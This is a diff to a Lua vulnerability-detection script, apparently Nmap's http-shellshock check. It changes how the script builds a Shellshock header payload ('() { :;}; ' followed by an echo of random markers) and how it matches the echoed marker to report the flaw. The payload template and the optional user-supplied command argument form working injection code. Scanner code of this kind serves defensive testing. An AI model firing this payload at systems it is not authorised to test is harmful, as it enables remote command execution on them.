@@ -83,12 +83,13 @@ portrule = shortport.http
 function generate_http_req(host, port, uri, custom_header, cmd)
   local rnd = nil
   --Set custom or probe with random string as cmd
-  if cmd ~= nil then
-    cmd = '() { :;}; '..cmd
- else
-    rnd = rand.random_alpha(15)
-    cmd = '() { :;}; echo; echo "'..rnd..'"'
+  if not cmd then
+    local rnd1 = rand.random_alpha(7)
+    local rnd2 = rand.random_alpha(7)
+    rnd = rnd1 .. rnd2
+    cmd = ("echo; echo -n %s; echo %s"):format(rnd1, rnd2)
   end
+  cmd = "() { :;}; " .. cmd
   -- Plant the payload in the HTTP headers
   local options = {header={}}
   options["no_cache"] = true
@@ -104,20 +105,15 @@ function generate_http_req(host, port, uri, custom_header, cmd)
   end
   local req = http.get(host, port, uri, options)
 
-  if not(cmd) then
-    return req
-  else
-    return req, rnd
-  end
+  return req, rnd
 end
 
 action = function(host, port)
   local cmd = stdnse.get_script_args(SCRIPT_NAME..".cmd") or nil
   local http_header = stdnse.get_script_args(SCRIPT_NAME..".header") or nil
   local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or '/'
-  local rnd = nil
   local req, rnd = generate_http_req(host, port, uri, http_header, nil)
-  if req.status == 200 and string.match(req.body, rnd) ~= nil then
+  if req.status == 200 and req.body:find(rnd, 1, true) then
     local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
     local vuln = {
       title = 'HTTP Shellshock vulnerability',
